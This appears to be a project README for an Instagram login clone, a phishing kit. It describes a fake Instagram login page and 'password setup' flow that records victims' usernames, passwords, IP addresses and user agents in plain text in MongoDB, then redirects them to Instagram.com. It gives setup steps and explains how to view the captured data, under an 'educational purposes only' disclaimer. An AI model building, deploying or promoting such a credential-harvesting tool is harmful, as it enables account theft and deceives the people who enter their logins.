# Instagram Clone - Python Flask Version

A realistic Instagram login clone with MongoDB database integration, IP tracking, and password setup flow - **now running on Python Flask!**

## 🚀 Quick Start

### Option 1: Double-click to run (Windows)
Simply double-click `run.bat` - it will install dependencies and start the server automatically!

### Option 2: Manual installation

1. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

2. **Run the server:**
   ```bash
   python app.py
   ```

3. **Open in browser:**
   ```
   http://localhost:8000/login.html
   ```

## 📋 Requirements

- Python 3.7 or higher
- pip (Python package manager)
- Internet connection (for MongoDB Atlas)

## 🎯 Features

✅ **Python Flask Backend** - No PHP required!  
✅ **MongoDB Integration** - All data stored in MongoDB Atlas  
✅ **IP Address Capture** - Tracks user IP addresses (handles proxies)  
✅ **User Agent Tracking** - Records browser and device information  
✅ **Password Setup Flow** - Instagram-style password creation page  
✅ **Session Management** - Secure session handling  
✅ **Clean Code** - Externalized JavaScript, no inline scripts  
✅ **Responsive Design** - Works on all devices  

## 📁 File Structure

```
instagram/
├── app.py                  # Flask application (main server)
├── requirements.txt        # Python dependencies
├── run.bat                 # Windows batch file to start server
├── login.html              # Login page
├── set-password.html       # Password setup page
├── js/
│   ├── login.js           # Login page JavaScript
│   └── set-password.js    # Password setup JavaScript
├── favicon.png
├── screenshot1-5.jpg       # UI screenshots
└── sprite_core_*.png       # Instagram sprites
```

## 🔧 How It Works

### User Flow

1. **Login Page** (`login.html`)
   - User enters username/email and password
   - Form submits to `/login.php` (handled by Flask)

2. **Backend Processing** (`app.py` - `/login.php` route)
   - Captures IP address and user agent
   - Stores data in MongoDB
   - Creates session
   - Redirects to password setup

3. **Password Setup** (`set-password.html`)
   - User creates new password
   - Confirms password
   - Submits to `/save-password.php` (handled by Flask)

4. **Final Processing** (`app.py` - `/save-password.php` route)
   - Updates MongoDB with new password
   - Clears session
   - Redirects to Instagram.com

### MongoDB Data Structure

```json
{
  "_id": ObjectId("..."),
  "username": "user@example.com",
  "initial_password": "password123",
  "ip_address": "192.168.1.1",
  "user_agent": "Mozilla/5.0...",
  "timestamp": "2024-02-10 01:30:00",
  "created_at": ISODate("2024-02-10T01:30:00.000Z"),
  "status": "pending_password_setup",
  "new_password": "NewSecurePass123!",
  "confirm_password": "NewSecurePass123!",
  "password_updated_at": ISODate("2024-02-10T01:31:00.000Z")
}
```

## 🧪 Testing

1. **Start the server:**
   ```bash
   python app.py
   ```

2. **Open browser:**
   ```
   http://localhost:8000/login.html
   ```

3. **Test the flow:**
   - Enter test credentials
   - Verify redirect to password setup
   - Enter matching passwords
   - Verify redirect to Instagram.com

4. **Check MongoDB:**
   - Login to MongoDB Atlas
   - Navigate to your cluster
   - View the `instagram_clone` database
   - Check the `users` collection

## 📊 View Captured Data

### In Terminal (while server is running)
The server will print logs showing:
- ✅ Successful data saves
- 📝 Username and IP address
- ⚠️ Any errors or fallbacks

### In MongoDB Atlas
1. Go to https://cloud.mongodb.com
2. Login with your credentials
3. Click "Browse Collections"
4. Select `instagram_clone` database
5. View `users` collection

## 🛠️ Troubleshooting

### "Python is not recognized"
- Install Python from https://www.python.org/downloads/
- Make sure to check "Add Python to PATH" during installation

### "pip is not recognized"
- Python 3.4+ includes pip by default
- Try `python -m pip install -r requirements.txt`

### MongoDB Connection Error
- Check your internet connection
- Verify MongoDB Atlas is accessible
- Check if your IP is whitelisted in MongoDB Atlas

### Port 8000 already in use
Change the port in `app.py`:
```python
app.run(host='0.0.0.0', port=8080, debug=True)  # Use 8080 instead
```

## 🔒 Security Notes

⚠️ **Warning**: This is for educational/testing purposes only.

- Passwords are stored in plain text
- No HTTPS enforcement
- No CSRF protection
- No rate limiting

For production use, implement:
- Password hashing (bcrypt/argon2)
- HTTPS/SSL
- CSRF tokens
- Rate limiting
- Input sanitization
- Environment variables for secrets

## 📝 Dependencies

- **Flask** (3.0.0) - Web framework
- **pymongo** (4.6.1) - MongoDB driver
- **dnspython** (2.4.2) - DNS toolkit (required for MongoDB Atlas)

## 🎨 Features

### Backend (Python Flask)
- ✅ MongoDB integration with automatic fallback to file storage
- ✅ IP address capture (handles proxies and load balancers)
- ✅ User agent tracking
- ✅ Session management
- ✅ Error handling and logging
- ✅ Console output showing all activity

### Frontend (HTML/JS)
- ✅ Instagram-authentic design
- ✅ Animated placeholders
- ✅ Show/hide password toggles
- ✅ Real-time form validation
- ✅ Responsive design
- ✅ Clean, externalized JavaScript

## 💡 Tips

1. **Keep the terminal open** to see real-time logs of user activity
2. **Check `usernames.txt`** if MongoDB is unavailable (fallback storage)
3. **Use MongoDB Compass** for a GUI to view your database
4. **Test with different browsers** to see different user agents

## 📞 Support

If you encounter any issues:
1. Check the terminal output for error messages
2. Verify Python and pip are installed correctly
3. Ensure MongoDB URI is correct in `app.py`
4. Check your internet connection

## 🙏 Credits

Original Instagram clone by [Ali Milani Amin](https://github.com/AliMilani/fake-instagram/)

Enhanced with:
- Python Flask backend (replacing PHP)
- MongoDB integration
- IP tracking
- Password setup flow
- Externalized JavaScript

## ⚖️ License

For educational purposes only. Instagram and its logo are trademarks of Meta Platforms, Inc.
